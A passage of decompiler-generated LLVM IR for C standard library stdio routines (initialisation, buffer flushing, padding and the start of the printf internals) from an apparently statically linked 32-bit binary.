  %v3_10008310 = inttoptr i32 %v2_10008310 to i32*
  store i32 %v0_10008310, i32* %v3_10008310, align 4
  %v0_10008314 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008314 = load i32, i32* @r31, align 4
  %v2_10008314 = add i32 %v1_10008314, 16
  %v3_10008314 = inttoptr i32 %v2_10008314 to i32*
  store i32 %v0_10008314, i32* %v3_10008314, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v0_1000831c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000831c = load i32, i32* @r31, align 4
  %v2_1000831c = add i32 %v1_1000831c, 44
  %v3_1000831c = inttoptr i32 %v2_1000831c to i32*
  store i32 %v0_1000831c, i32* %v3_1000831c, align 4
  %v3_10008320 = load i32, i32* @global_var_100234fc.285, align 4
  store i32 %v3_10008320, i32* %r0.global-to-local, align 4
  %v1_10008324 = load i32, i32* @r31, align 4
  %v2_10008324 = add i32 %v1_10008324, 52
  %v3_10008324 = inttoptr i32 %v2_10008324 to i32*
  store i32 %v3_10008320, i32* %v3_10008324, align 4
  %v0_10008328 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10008328, label %dec_label_pc_100083ac, label %dec_label_pc_1000832c

dec_label_pc_1000832c:                            ; preds = %dec_label_pc_100082f0
  store i32 ptrtoint ([3 x i8]* @global_var_1000bfac.279 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_100231b8.280 to i32), i32* %r29.global-to-local, align 4
  %v2_1000833c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000833c, i32* @r26, align 4
  store i32 %v2_1000833c, i32* @r3, align 4
  %v0_1000834c = call i32 @__pthread_return_void()
  %v2_10008358 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10008358, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_100231a0.286 to i32), i32* @r29, align 4
  %v0_10008360 = call i32 @__pthread_return_0()
  store i32 %v2_10008358, i32* @r3, align 4
  %v0_10008370 = call i32 @__pthread_return_void()
  %v0_10008378 = call i32 @__pthread_return_0()
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10008380 = load i32, i32* bitcast (i32** @global_var_100234f8.287 to i32*), align 4
  store i32 %v3_10008380, i32* %r0.global-to-local, align 4
  store i32 %v2_10008358, i32* @r3, align 4
  %v1_1000838c = load i32, i32* @r31, align 4
  %v2_1000838c = add i32 %v1_1000838c, 32
  %v3_1000838c = inttoptr i32 %v2_1000838c to i32*
  store i32 %v3_10008380, i32* %v3_1000838c, align 4
  %v0_10008390 = load i32, i32* @r31, align 4
  store i32 %v0_10008390, i32* bitcast (i32** @global_var_100234f8.287 to i32*), align 4
  %v0_10008394 = call i32 @__pthread_return_void()
  store i32 %v2_1000833c, i32* @r3, align 4
  %v0_100083a0 = call i32 @__pthread_return_void()
  br label %dec_label_pc_100083ac

dec_label_pc_100083a8:                            ; preds = %dec_label_pc_1000815c, %dec_label_pc_10008148, %dec_label_pc_10008168
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_100083ac

dec_label_pc_100083ac:                            ; preds = %dec_label_pc_100082f0, %dec_label_pc_100081a8, %dec_label_pc_1000832c, %dec_label_pc_100083a8
  store i32 %v0_10008108, i32* %r0.global-to-local, align 4
  %v0_100083b0 = load i32, i32* @r31, align 4
  ret i32 %v0_100083b0

; uselistorder directives
  uselistorder i32 %v1_100082ec, { 2, 0, 1 }
  uselistorder i32 %v0_10008260, { 1, 0 }
  uselistorder i32 %v0_100081ac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10008198, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17 }
  uselistorder i32 16384, { 4, 0, 1, 2, 3 }
  uselistorder i32 21, { 1, 2, 0, 3 }
  uselistorder i32 577, { 0, 3, 1, 2 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_100083ac, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_100083a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100082f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000823c, { 1, 0 }
  uselistorder label %dec_label_pc_100081d0, { 1, 0 }
  uselistorder label %dec_label_pc_100081a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000818c, { 1, 0 }
  uselistorder label %dec_label_pc_10008178, { 2, 0, 1 }
}

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268566528, i32* @r28, align 4
  %v0_100083d8 = call i32 @__errno_location()
  store i32 %v0_100083d8, i32* @r26, align 4
  %v1_100083e4 = inttoptr i32 %v0_100083d8 to i32*
  %v2_100083e4 = load i32, i32* %v1_100083e4, align 4
  store i32 %v2_100083e4, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_100231d0.275 to i32), i32* @r27, align 4
  %v3_100083ec = load i16, i16* @global_var_100231d0.275, align 2
  %v4_100083ec = zext i16 %v3_100083ec to i32
  store i32 %v4_100083ec, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100083f4.289 to i32), i32* @lr, align 4
  %v1_100083f0 = call i32 @isatty(i32 0)
  %v1_100083f4 = sub i32 1, %v1_100083f0
  %v1_100083f8 = mul i32 %v1_100083f4, 256
  %v0_100083fc = load i32, i32* @r29, align 4
  %v2_100083fc = xor i32 %v1_100083f8, %v0_100083fc
  %v1_10008404 = trunc i32 %v2_100083fc to i16
  store i16 %v1_10008404, i16* @global_var_100231d0.275, align 2
  %v3_10008408 = load i16, i16* @global_var_10023220.276, align 2
  %v4_10008408 = zext i16 %v3_10008408 to i32
  store i32 %v4_10008408, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008410.290 to i32), i32* @lr, align 4
  %v1_1000840c = call i32 @isatty(i32 1)
  %v1_10008410 = sub i32 1, %v1_1000840c
  %v1_10008414 = mul i32 %v1_10008410, 256
  %v0_10008418 = load i32, i32* @r29, align 4
  %v2_10008418 = xor i32 %v1_10008414, %v0_10008418
  %v1_1000841c = trunc i32 %v2_10008418 to i16
  store i16 %v1_1000841c, i16* @global_var_10023220.276, align 2
  %v0_10008420 = load i32, i32* @r25, align 4
  %v1_10008420 = load i32, i32* @r26, align 4
  %v2_10008420 = inttoptr i32 %v1_10008420 to i32*
  store i32 %v0_10008420, i32* %v2_10008420, align 4
  ret i32 %v1_10008414

; uselistorder directives
  uselistorder i32 %v1_10008414, { 1, 0 }
  uselistorder i16* @global_var_10023220.276, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10011b10.291 to i32), i32* @r4, align 4
  %v0_10008444 = call i32 @memcpy()
  ret i32 %v0_10008444
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100231a0.286 to i32), i32* @r3, align 4
  store i32 268469348, i32* @lr, align 4
  %v0_10008460 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_100231b8.280 to i32), i32* @r3, align 4
  store i32 268469360, i32* @lr, align 4
  %v0_1000846c = call i32 @__stdio_init_mutex()
  store i32 268566528, i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_100234f8.287 to i32*), align 4
  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_100084b89 = icmp eq i32 %storemerge6, 0
  %v1_100084bc11 = add i32 %storemerge6, 56
  store i32 %v1_100084bc11, i32* %r30.global-to-local, align 4
  br i1 %v3_100084b89, label %dec_label_pc_100084c8, label %dec_label_pc_1000847c

dec_label_pc_1000847c:                            ; preds = %entry, %dec_label_pc_100084a8
  %v0_1000847c = call i32 @__pthread_return_0()
  %v3_10008480 = icmp eq i32 %v0_1000847c, 0
  %v0_10008484 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10008484, i32* @r3, align 4
  br i1 %v3_10008480, label %dec_label_pc_100084a8, label %dec_label_pc_1000848c

dec_label_pc_1000848c:                            ; preds = %dec_label_pc_1000847c
  %v0_1000848c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000848c = add i32 %v0_1000848c, 8
  %v2_1000848c = inttoptr i32 %v1_1000848c to i32*
  %v3_1000848c = load i32, i32* %v2_1000848c, align 4
  store i32 %v3_1000848c, i32* %r9.global-to-local, align 4
  %v3_10008494 = inttoptr i32 %v0_1000848c to i16*
  store i16 48, i16* %v3_10008494, align 2
  %v0_10008498 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008498 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008498 = add i32 %v1_10008498, 20
  %v3_10008498 = inttoptr i32 %v2_10008498 to i32*
  store i32 %v0_10008498, i32* %v3_10008498, align 4
  %v0_1000849c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000849c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000849c = add i32 %v1_1000849c, 24
  %v3_1000849c = inttoptr i32 %v2_1000849c to i32*
  store i32 %v0_1000849c, i32* %v3_1000849c, align 4
  %v0_100084a0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100084a0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100084a0 = add i32 %v1_100084a0, 28
  %v3_100084a0 = inttoptr i32 %v2_100084a0 to i32*
  store i32 %v0_100084a0, i32* %v3_100084a0, align 4
  %v0_100084a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100084a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100084a4 = add i32 %v1_100084a4, 16
  %v3_100084a4 = inttoptr i32 %v2_100084a4 to i32*
  store i32 %v0_100084a4, i32* %v3_100084a4, align 4
  br label %dec_label_pc_100084a8

dec_label_pc_100084a8:                            ; preds = %dec_label_pc_1000847c, %dec_label_pc_1000848c
  %v1_100084ac = load i32, i32* %r31.global-to-local, align 4
  %v2_100084ac = add i32 %v1_100084ac, 52
  %v3_100084ac = inttoptr i32 %v2_100084ac to i32*
  store i32 1, i32* %v3_100084ac, align 4
  store i32 268469428, i32* @lr, align 4
  %v0_100084b0 = call i32 @__stdio_init_mutex()
  %v0_100084b4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100084b4 = add i32 %v0_100084b4, 32
  %v2_100084b4 = inttoptr i32 %v1_100084b4 to i32*
  %storemerge = load i32, i32* %v2_100084b4, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_100084b8 = icmp eq i32 %storemerge, 0
  %v1_100084bc = add i32 %storemerge, 56
  store i32 %v1_100084bc, i32* %r30.global-to-local, align 4
  br i1 %v3_100084b8, label %dec_label_pc_100084b8.dec_label_pc_100084c8_crit_edge, label %dec_label_pc_1000847c

dec_label_pc_100084b8.dec_label_pc_100084c8_crit_edge: ; preds = %dec_label_pc_100084a8
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_100234f8.287 to i32*), align 4
  br label %dec_label_pc_100084c8

dec_label_pc_100084c8:                            ; preds = %dec_label_pc_100084b8.dec_label_pc_100084c8_crit_edge, %entry
  %v0_1000850416 = phi i32 [ %v1_100084bc, %dec_label_pc_100084b8.dec_label_pc_100084c8_crit_edge ], [ %v1_100084bc11, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_100084b8.dec_label_pc_100084c8_crit_edge ], [ 0, %entry ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_100084ec5 = icmp eq i32 %storemerge12, 0
  br i1 %v3_100084ec5, label %dec_label_pc_100084f4, label %dec_label_pc_100084d4

dec_label_pc_100084d4:                            ; preds = %dec_label_pc_100084c8, %dec_label_pc_100084e8
  %v0_100084d4 = phi i32 [ %storemerge1, %dec_label_pc_100084e8 ], [ %storemerge12, %dec_label_pc_100084c8 ]
  %v1_100084d4 = inttoptr i32 %v0_100084d4 to i16*
  %v2_100084d4 = load i16, i16* %v1_100084d4, align 2
  %v3_100084d4 = zext i16 %v2_100084d4 to i32
  store i32 %v0_100084d4, i32* @r3, align 4
  %v1_100084dc = and i32 %v3_100084d4, 64
  store i32 %v1_100084dc, i32* %r9.global-to-local, align 4
  %v3_100084dc = icmp eq i32 %v1_100084dc, 0
  br i1 %v3_100084dc, label %dec_label_pc_100084e8, label %dec_label_pc_100084e4

dec_label_pc_100084e4:                            ; preds = %dec_label_pc_100084d4
  store i32 268469480, i32* @lr, align 4
  %v0_100084e4 = call i32 @__stdio_wcommit()
  %v0_100084e8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100084e8

dec_label_pc_100084e8:                            ; preds = %dec_label_pc_100084d4, %dec_label_pc_100084e4
  %v0_100084e8 = phi i32 [ %v0_100084d4, %dec_label_pc_100084d4 ], [ %v0_100084e8.pre, %dec_label_pc_100084e4 ]
  %v0_1000850417 = phi i32 [ %v0_100084d4, %dec_label_pc_100084d4 ], [ %v0_100084e4, %dec_label_pc_100084e4 ]
  %v1_100084e8 = add i32 %v0_100084e8, 32
  %v2_100084e8 = inttoptr i32 %v1_100084e8 to i32*
  %storemerge1 = load i32, i32* %v2_100084e8, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_100084ec = icmp eq i32 %storemerge1, 0
  br i1 %v3_100084ec, label %dec_label_pc_100084f4, label %dec_label_pc_100084d4

dec_label_pc_100084f4:                            ; preds = %dec_label_pc_100084e8, %dec_label_pc_100084c8
  %v0_10008504 = phi i32 [ %v0_1000850416, %dec_label_pc_100084c8 ], [ %v0_1000850417, %dec_label_pc_100084e8 ]
  ret i32 %v0_10008504

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_100084d4, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32* %r31.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_init_mutex, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_100084e8, { 1, 0 }
  uselistorder label %dec_label_pc_100084d4, { 1, 0 }
  uselistorder label %dec_label_pc_100084a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000847c, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %v0_10008510 = load i32, i32* @r31, align 4
  %v0_10008514 = load i32, i32* @r3, align 4
  %v1_1000851c = add i32 %v0_10008514, 8
  %v2_1000851c = inttoptr i32 %v1_1000851c to i32*
  %v3_1000851c = load i32, i32* %v2_1000851c, align 4
  %v1_10008520 = add i32 %v0_10008514, 16
  %v2_10008520 = inttoptr i32 %v1_10008520 to i32*
  %v3_10008520 = load i32, i32* %v2_10008520, align 4
  %v2_10008528 = sub i32 %v3_10008520, %v3_1000851c
  store i32 %v2_10008528, i32* @r5, align 4
  %v5_10008528 = icmp eq i32 %v2_10008528, 0
  br i1 %v5_10008528, label %dec_label_pc_10008538, label %dec_label_pc_10008530

dec_label_pc_10008530:                            ; preds = %entry
  store i32 %v3_1000851c, i32* %v2_10008520, align 4
  store i32 268469560, i32* @lr, align 4
  %v2_10008534 = inttoptr i32 %v3_1000851c to i16*
  %v3_10008534 = call i32 @__stdio_WRITE(i16* %v2_10008534, i32 %v2_10008528)
  %v0_10008538.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008538

dec_label_pc_10008538:                            ; preds = %entry, %dec_label_pc_10008530
  %v0_10008538 = phi i32 [ %v0_10008514, %entry ], [ %v0_10008538.pre, %dec_label_pc_10008530 ]
  %v1_10008538 = add i32 %v0_10008538, 8
  %v2_10008538 = inttoptr i32 %v1_10008538 to i32*
  %v3_10008538 = load i32, i32* %v2_10008538, align 4
  %v1_1000853c = add i32 %v0_10008538, 16
  %v2_1000853c = inttoptr i32 %v1_1000853c to i32*
  %v3_1000853c = load i32, i32* %v2_1000853c, align 4
  store i32 %v0_10008510, i32* @r31, align 4
  %v2_10008544 = sub i32 %v3_1000853c, %v3_10008538
  ret i32 %v2_10008544

; uselistorder directives
  uselistorder i32 %v0_10008538, { 1, 0 }
  uselistorder i32 %v3_1000851c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008538, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_100085803 = icmp eq i32 %arg3, 0
  %v2_10008584 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_100085803, label %dec_label_pc_100085a0, label %dec_label_pc_10008594

dec_label_pc_1000857c:                            ; preds = %dec_label_pc_10008594
  %v1_1000857c = add i32 %v0_1000857c, -1
  store i32 %v1_1000857c, i32* @r31, align 4
  %v3_10008580 = icmp eq i32 %v1_1000857c, 0
  %v0_1000858c = load i32, i32* @r29, align 4
  br i1 %v3_10008580, label %dec_label_pc_100085a0.loopexit, label %dec_label_pc_10008594

dec_label_pc_10008594:                            ; preds = %entry, %dec_label_pc_1000857c
  %v0_1000858c5 = phi i32 [ %v0_1000858c, %dec_label_pc_1000857c ], [ %arg1, %entry ]
  store i32 268469656, i32* @lr, align 4
  %v3_10008594 = inttoptr i32 %v0_1000858c5 to i16*
  %v4_10008594 = call i32 @__stdio_fwrite(i32 %v2_10008584, i32 1, i16* %v3_10008594)
  %v3_10008598 = icmp eq i32 %v4_10008594, 1
  %v0_1000857c = load i32, i32* @r31, align 4
  br i1 %v3_10008598, label %dec_label_pc_1000857c, label %dec_label_pc_100085a0.loopexit

dec_label_pc_100085a0.loopexit:                   ; preds = %dec_label_pc_1000857c, %dec_label_pc_10008594
  %v0_100085a4.ph = phi i32 [ %v0_1000857c, %dec_label_pc_10008594 ], [ 0, %dec_label_pc_1000857c ]
  %v1_100085a4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100085a0

dec_label_pc_100085a0:                            ; preds = %dec_label_pc_100085a0.loopexit, %entry
  %v1_100085a4 = phi i32 [ 0, %entry ], [ %v1_100085a4.pre, %dec_label_pc_100085a0.loopexit ]
  %v0_100085a4 = phi i32 [ 0, %entry ], [ %v0_100085a4.ph, %dec_label_pc_100085a0.loopexit ]
  %v2_100085a4 = sub i32 %v1_100085a4, %v0_100085a4
  ret i32 %v2_100085a4

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100085a0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_10008594, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  %v1_100085cc = and i32 %arg2, 128
  %v3_100085cc = icmp eq i32 %v1_100085cc, 0
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_100085cc, label %dec_label_pc_1000861c, label %dec_label_pc_100085e8

dec_label_pc_100085e8:                            ; preds = %entry
  %v0_100085e8 = call i32 @__GI_strlen()
  %v0_100085ec = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100085e8, i32* @r31, align 4
  %v0_100085f4 = load i32, i32* %r26.global-to-local, align 4
  %v1_100085f8 = load i32, i32* %r30.global-to-local, align 4
  %v2_100085f8 = sub i32 %v1_100085f8, %v0_100085e8
  store i32 %v2_100085f8, i32* %r29.global-to-local, align 4
  store i32 %v0_100085e8, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_100085f8, 1
  br i1 %tmp7, label %dec_label_pc_1000861c, label %dec_label_pc_10008608

dec_label_pc_10008608:                            ; preds = %dec_label_pc_100085e8
  %v1_100085ec = urem i32 %v0_100085ec, 128
  store i32 268469772, i32* @lr, align 4
  %v3_10008608 = trunc i32 %v1_100085ec to i8
  %v4_10008608 = call i32 @_charpad(i32 %v0_100085f4, i8 %v3_10008608, i32 %v2_100085f8)
  %v0_1000860c = load i32, i32* @r31, align 4
  store i32 %v0_1000860c, i32* %r30.global-to-local, align 4
  %v1_10008610 = load i32, i32* @r29, align 4
  %v4_10008610 = icmp eq i32 %v4_10008608, %v1_10008610
  store i32 %v4_10008608, i32* @r28, align 4
  br i1 %v4_10008610, label %dec_label_pc_10008608.dec_label_pc_1000861c_crit_edge, label %dec_label_pc_10008640

dec_label_pc_10008608.dec_label_pc_1000861c_crit_edge: ; preds = %dec_label_pc_10008608
  %v0_10008628.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1000861c

dec_label_pc_1000861c:                            ; preds = %dec_label_pc_10008608.dec_label_pc_1000861c_crit_edge, %dec_label_pc_100085e8, %entry
  %v0_10008628 = phi i32 [ %v0_10008628.pre, %dec_label_pc_10008608.dec_label_pc_1000861c_crit_edge ], [ %v0_100085f4, %dec_label_pc_100085e8 ], [ %arg1, %entry ]
  %v0_10008624 = phi i32 [ %v0_1000860c, %dec_label_pc_10008608.dec_label_pc_1000861c_crit_edge ], [ %v0_100085e8, %dec_label_pc_100085e8 ], [ %arg3, %entry ]
  %tmp8 = icmp slt i32 %v0_10008624, 1
  br i1 %tmp8, label %dec_label_pc_1000863c, label %dec_label_pc_10008634

dec_label_pc_10008634:                            ; preds = %dec_label_pc_1000861c
  %v0_10008620 = load i32, i32* @r27, align 4
  store i32 268469816, i32* @lr, align 4
  %v3_10008634 = inttoptr i32 %v0_10008628 to i16*
  %v4_10008634 = call i32 @__stdio_fwrite(i32 %v0_10008620, i32 %v0_10008624, i16* %v3_10008634)
  br label %dec_label_pc_1000863c

dec_label_pc_1000863c:                            ; preds = %dec_label_pc_1000861c, %dec_label_pc_10008634
  %v1_1000863c = phi i32 [ 0, %dec_label_pc_1000861c ], [ %v4_10008634, %dec_label_pc_10008634 ]
  %v0_1000863c = load i32, i32* @r28, align 4
  %v2_1000863c = add i32 %v0_1000863c, %v1_1000863c
  br label %dec_label_pc_10008640

dec_label_pc_10008640:                            ; preds = %dec_label_pc_10008608, %dec_label_pc_1000863c
  %v0_10008644 = phi i32 [ %v4_10008608, %dec_label_pc_10008608 ], [ %v2_1000863c, %dec_label_pc_1000863c ]
  ret i32 %v0_10008644

; uselistorder directives
  uselistorder i32 %v0_10008624, { 1, 0 }
  uselistorder i32 %v2_100085f8, { 1, 0, 2 }
  uselistorder i32* %r26.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_10008640, { 1, 0 }
  uselistorder label %dec_label_pc_1000863c, { 1, 0 }
}

define i32 @_vfprintf_internal() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_3()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_3()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_1000865c = load i32, i32* @lr, align 4
  store i32 %v0_1000865c, i32* %r0.global-to-local, align 4
  %v2_10008664 = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_10008664, i32* %r30.global-to-local, align 4
  %v0_10008668 = load i32, i32* @r3, align 4
  store i32 %v0_10008668, i32* %r24.global-to-local, align 4
  %v0_10008674 = load i32, i32* @r5, align 4
  store i32 %v0_10008674, i32* %r31.global-to-local, align 4
  %v0_10008678 = load i32, i32* @r4, align 4
  store i32 %v0_10008678, i32* @r29, align 4
  store i32 268469888, i32* @lr, align 4
  %v1_1000867c = bitcast i8** %stack_var_-200 to i32*
  %v2_1000867c = call i32 @_ppfs_init(i32* %v1_1000867c)
  %tmp72 = icmp sgt i32 %v2_1000867c, -1
  br i1 %tmp72, label %dec_label_pc_100086b0, label %dec_label_pc_10008688

dec_label_pc_10008688:                            ; preds = %entry
  %v3_10008688 = load i8*, i8** %stack_var_-200, align 4
  %v4_10008688 = ptrtoint i8* %v3_10008688 to i32
  store i32 %v4_10008688, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_10008688, i32* @r3, align 4
  %v0_10008694 = call i32 @__GI_strlen()
  %v3_10008698 = icmp eq i32 %v0_10008694, 0
  br i1 %v3_10008698, label %dec_label_pc_10008cb0, label %dec_label_pc_100086a0

dec_label_pc_100086a0:                            ; preds = %dec_label_pc_10008688
  %v0_100086a0 = load i32, i32* @r31, align 4
  %v0_100086a4 = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100086ac.292 to i32), i32* @lr, align 4
  %v3_100086a8 = inttoptr i32 %v0_100086a4 to i16*
  %v4_100086a8 = call i32 @__stdio_fwrite(i32 %v0_100086a0, i32 %v0_10008694, i16* %v3_100086a8)
  br label %dec_label_pc_10008cb0

dec_label_pc_100086b0:                            ; preds = %entry
  %v0_100086b4 = load i32, i32* @r31, align 4
  store i32 268469948, i32* @lr, align 4
  %v2_100086b8 = call i32 @_ppfs_prepargs(i32 %v2_10008664, i32 %v0_100086b4)
  store i32 0, i32* %r23.global-to-local, align 4
  %v4_10008750 = zext i8 %tmp59 to i32
  %v2_10008754 = icmp sgt i32 %tmp60, 0
  %v2_10008758 = ptrtoint i32* %stack_var_-112 to i32
  %v2_1000877c = ptrtoint i32* %stack_var_-344 to i32
  %v3_10008780 = icmp eq i32 %tmp58, 0
  %tmp73 = icmp sgt i32 %tmp58, -1
  %v3_100087b4 = icmp eq i32 %tmp57, 0
  %v2_10008b10 = ptrtoint i32* %stack_var_-328 to i32
  %v2_10008a30 = ptrtoint i32* %stack_var_-340 to i32
  %v2_10008a34 = ptrtoint i32* %stack_var_-336 to i32
  %v5_100088a8 = bitcast i32* %stack_var_-201 to i8*
  %tmp74 = icmp ult i32 %tmp57, 6
  %v3_10008984 = icmp eq i32 %tmp57, 1
  %v2_10008928 = icmp ugt i32 %tmp57, 2
  %v4_10008868 = zext i8 %tmp55 to i32
  %v0_10008c9c.pre = load i32, i32* @r29, align 4
  %v1_10008768 = mul nuw nsw i32 %v4_10008750, 8
  %v2_1000876c = add i32 %v2_10008758, %v1_10008768
  %v1_10008770 = add i32 %v2_1000876c, -8
  %v1_10008784 = add i32 %tmp58, 1
  %v2_100087dc = icmp ugt i32 %tmp57, 7
  %v2_100089bc = icmp ugt i32 %tmp57, 15
  %v2_100089f0 = icmp ugt i32 %tmp57, 17
  %v3_100089f0 = icmp eq i32 %tmp57, 17
  %v2_10008a98 = icmp ugt i32 %tmp57, 19
  %v3_10008a98 = icmp eq i32 %tmp57, 19
  %v3_10008b04 = icmp eq i32 %tmp57, 20
  %v1_100087f4 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_10011b44.294 to i32), i32 -1)
  %v2_100087f4 = inttoptr i32 %v1_100087f4 to i8*
  %v3_10008934 = icmp eq i32 %tmp57, 3
  %v3_10008944 = icmp eq i32 %tmp57, 4
  br label %dec_label_pc_10008c9c

dec_label_pc_100086c8.backedge:                   ; preds = %dec_label_pc_1000871c, %dec_label_pc_100086d4
  %storemerge13.in = phi i32 [ %v1_100086e4, %dec_label_pc_100086d4 ], [ %v1_1000871c, %dec_label_pc_1000871c ]
  %v1_100086dc16 = phi i32 [ %v0_100086f4, %dec_label_pc_100086d4 ], [ %v1_1000871c, %dec_label_pc_1000871c ]
  %storemerge13 = add i32 %storemerge13.in, 1
  store i32 %storemerge13, i32* @r29, align 4
  br label %dec_label_pc_100086c8

dec_label_pc_100086c8:                            ; preds = %dec_label_pc_100086c8.backedge, %dec_label_pc_10008c9c
  %v0_100086f4 = phi i32 [ %v1_100086dc16, %dec_label_pc_100086c8.backedge ], [ %v0_10008c9c, %dec_label_pc_10008c9c ]
  %v1_100086e4 = phi i32 [ %storemerge13, %dec_label_pc_100086c8.backedge ], [ %v0_10008c9c, %dec_label_pc_10008c9c ]
  %v1_100086c8 = inttoptr i32 %v1_100086e4 to i8*
  %v2_100086c8 = load i8, i8* %v1_100086c8, align 1
  %v3_100086c8 = zext i8 %v2_100086c8 to i32
  store i32 %v3_100086c8, i32* %r0.global-to-local, align 4
  %v3_100086cc = icmp eq i8 %v2_100086c8, 0
  br i1 %v3_100086cc, label %dec_label_pc_100086dc, label %dec_label_pc_100086d4

